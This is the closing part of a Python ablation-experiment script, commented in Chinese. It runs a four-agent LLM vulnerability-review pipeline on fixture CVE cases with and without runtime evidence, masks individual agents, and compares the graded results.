    # ── 消融组 A：纯规则基线（两个数据态各测一次） ──
    if "A" in runs:
        print("== [A] 纯规则基线（有运行时证据数据态） ==")
        factory, engine = build("A-c", True)
        db = factory()
        build_fixture(db, with_runtime=True)
        baseline_c = collect_baseline(db)
        print(json.dumps(baseline_c, ensure_ascii=False, indent=1))
        results["A_baseline_with_runtime"] = baseline_c
        db.close()
        close(engine)

        print("== [A] 纯规则基线（无运行时证据数据态） ==")
        factory, engine = build("A-b", False)
        db = factory()
        build_fixture(db, with_runtime=False)
        baseline_b = collect_baseline(db)
        results["A_baseline_no_runtime"] = baseline_b
        db.close()
        close(engine)

    if args.dry:
        (out_dir / "aggregate.json").write_text(
            json.dumps(results, ensure_ascii=False, indent=1), encoding="utf-8")
        print("dry run 完成：Fixture 与规则基线已生成，未调用 LLM。")
        return

    if not app_config.DEEPSEEK_API_KEY:
        print("未配置 DEEPSEEK_API_KEY；仅完成规则基线（A 组）。不伪造智能体结果。")
        (out_dir / "aggregate.json").write_text(
            json.dumps(results, ensure_ascii=False, indent=1), encoding="utf-8")
        return

    # ── 消融组 C：四智能体 + 运行时证据（CF2 证据态 / 全部 5 案例） ──
    if "C" in runs:
        print("== [C] 四智能体评审（有运行时证据，5 案例） ==")
        from app import models
        from app.services.event_review_pipeline import build_evidence_packet
        factory, engine = build("C", True)
        db = factory()
        build_fixture(db, with_runtime=True)
        packets = {}
        for risk in db.query(models.RiskAssessment).all():
            if risk.review_status in erp_reviewable():
                packets[risk.cve_id.split(":")[0]] = build_evidence_packet(db, risk).model_dump()
        results["C"] = run_review(db, run_id="stage9c", counter=UsageCounter())
        results["C"]["event_packets"] = [
            {"case": case, "evidence_packet": packet} for case, packet in packets.items()]
        results["C_graded"] = grade_run(results["C"])
        results["C_scores"] = summarize_scores(results["C_graded"])
        print(json.dumps(results["C_scores"], ensure_ascii=False, indent=1))
        db.close()
        close(engine)

    # ── 消融组 B：四智能体、无运行时证据（CF1/CF3 反事实） ──
    if "B" in runs:
        print("== [B] 四智能体评审（无运行时证据，5 案例） ==")
        factory, engine = build("B", False)
        db = factory()
        build_fixture(db, with_runtime=False)
        results["B_baseline_rules"] = collect_baseline(db)
        results["B"] = run_review(db, run_id="stage9b", counter=UsageCounter())
        results["B_graded"] = grade_run(results["B"])
        results["B_scores"] = summarize_scores(results["B_graded"])
        print(json.dumps(results["B_scores"], ensure_ascii=False, indent=1))
        db.close()
        close(engine)

    # ── 消融组 D：逐个屏蔽单个智能体（在 C 数据态上，选 E1/E4 两个案例） ──
    if any(run.startswith("D") for run in runs):
        from app import models as app_models

        for index, mask in enumerate(["evidence_audit_agent", "impact_assessment_agent",
                                      "exposure_runtime_agent", "decision_coordinator_agent"], 1):
            key = f"D{index}"
            if key not in runs:
                continue
            print(f"== [{key}] 屏蔽 {mask}（E1+E4） ==")
            factory, engine = build(f"D{index}", True)
            db = factory()
            build_fixture(db, with_runtime=True)
            selected = [r for r in db.query(app_models.RiskAssessment).all()
                        if r.cve_id.split(":")[0] in {"CVE-2026-81001", "CVE-2026-81004"}]
            results[key] = run_review(db, run_id=f"stage9{key.lower()}",
                                      mask_agent=mask, counter=UsageCounter(),
                                      selected_risks=selected)
            results[key]["masked_agent"] = mask
            results[key]["events"] = [e for e in results[key]["events"]
                                      if e["case"] in {"CVE-2026-81001", "CVE-2026-81004"}]
            print(json.dumps({e["case"]: {"review_status": e["review_status"],
                                          "human_review_required": e["human_review_required"],
                                          "decision": e["decision"],
                                          "recommended_action": e["recommended_action"],
                                          "risk_direction": e["risk_direction"]}
                              for e in results[key]["events"]}, ensure_ascii=False, indent=1))
            db.close()
            close(engine)

    # ── System A：工具循环四智能体编排（真实 LLM） ──
    if "sysA" in runs:
        print("== [sysA] System A 工具循环编排（edge-01，全证据） ==")
        factory, engine = build("sysA", True)
        db = factory()
        build_fixture(db, with_runtime=True)
        counter = UsageCounter()
        results["sysA"] = run_system_a(db, "edge-01", "linux_host", counter)
        results["sysA"]["risk_baseline_rules"] = results.get(
            "A_baseline_with_runtime", {}).get("CVE-2026-81001", {})
        print(json.dumps({"status": results["sysA"]["status"],
                          "risk": results["sysA"]["risk"],
                          "usage": results["sysA"]["usage"],
                          "wall_seconds": results["sysA"]["wall_seconds"]},
                         ensure_ascii=False, indent=1))
        db.close()
        close(engine)

    if "sysA-mask" in runs:
        print("== [sysA-mask] System A 屏蔽 runtime_behavior_agent（风险聚合敏感性） ==")
        factory, engine = build("sysA-mask", True)
        db = factory()
        build_fixture(db, with_runtime=True)
        counter = UsageCounter()
        results["sysA_mask"] = run_system_a(db, "edge-01", "linux_host", counter, mask_runtime=True)
        print(json.dumps({"status": results["sysA_mask"]["status"],
                          "risk": results["sysA_mask"]["risk"],
                          "usage": results["sysA_mask"]["usage"]},
                         ensure_ascii=False, indent=1))
        db.close()
        close(engine)

    if "sysA-zephyr" in runs:
        print("== [sysA-zephyr] System A Zephyr 设备（CF6：无 Linux eBPF 能力边界） ==")
        from app import models
        factory, engine = build("sysA-zephyr", False)
        db = factory()
        build_fixture(db, with_runtime=False)
        db.add(models.IotDevice(
            device_id="zephyr-sensor-01", device_name="Zephyr Sensor 01",
            device_type="ip_camera", vendor="FixtureVendor", model="FC-100",
            firmware_version="3.5.0", os="Zephyr 3.5", ip="192.0.2.20",
            status="online", identity_source="active_probe",
        ))
        db.commit()
        counter = UsageCounter()
        results["sysA_zephyr"] = run_system_a(db, "zephyr-sensor-01", "device", counter)
        print(json.dumps({"status": results["sysA_zephyr"]["status"],
                          "capability_marks": results["sysA_zephyr"]["capability_marks"],
                          "runtime_stage": results["sysA_zephyr"]["stages"].get("RUNTIME"),
                          "risk": results["sysA_zephyr"]["risk"],
                          "usage": results["sysA_zephyr"]["usage"]},
                         ensure_ascii=False, indent=1))
        db.close()
        close(engine)

    # ── 汇总对比（消融效应量化） ──
    if "C" in results and "B" in results:
        results["C_minus_B"] = compare_runs(results["B"], results["C"])
    full = results.get("C") or {}
    for index, mask in enumerate(["evidence_audit_agent", "impact_assessment_agent",
                                  "exposure_runtime_agent", "decision_coordinator_agent"], 1):
        masked = results.get(f"D{index}")
        if masked and full:
            results[f"D{index}_vs_C"] = compare_runs(
                {k: masked[k] for k in ("events",)},
                {k: full[k] for k in ("events",)}, subset={"CVE-2026-81001", "CVE-2026-81004"})

    (out_dir / "aggregate.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=1, default=str), encoding="utf-8")
    print(f"\n完成。聚合结果已写入 {out_dir / 'aggregate.json'}（该目录不入库）")


def erp_reviewable():
    import app.services.event_review_pipeline as erp
    return erp.REVIEWABLE_STATUSES


def _event_signature(event: dict) -> dict:
    return {
        "case": event.get("case"),
        "review_status": event.get("review_status"),
        "human_review_required": event.get("human_review_required"),
        "final_score": event.get("final_score"),
        "risk_level": event.get("risk_level"),
        "decision": event.get("decision"),
        "recommended_action": event.get("recommended_action"),
        "recommended_priority": event.get("recommended_priority"),
        "risk_direction": event.get("risk_direction"),
        "review_confidence": event.get("review_confidence"),
    }


def compare_runs(base: dict, other: dict, subset: set | None = None) -> list[dict]:
    """逐案例对比两次评审的结构化结论变化（只比结构化字段，不比文字量）。"""
    base_map = {e["case"]: e for e in base.get("events", [])}
    deltas = []
    for event in other.get("events", []):
        case = event["case"]
        if subset and case not in subset:
            continue
        before = base_map.get(case)
        if not before:
            continue
        delta = {"case": case, "changed": False, "fields": {}}
        before_sig, after_sig = _event_signature(before), _event_signature(event)
        for field in ("review_status", "human_review_required", "final_score", "risk_level",
                      "decision", "recommended_action", "recommended_priority", "risk_direction"):
            if before_sig.get(field) != after_sig.get(field):
                delta["changed"] = True
                delta["fields"][field] = {"from": before_sig.get(field), "to": after_sig.get(field)}
        deltas.append(delta)
    return deltas


if __name__ == "__main__":
    main()
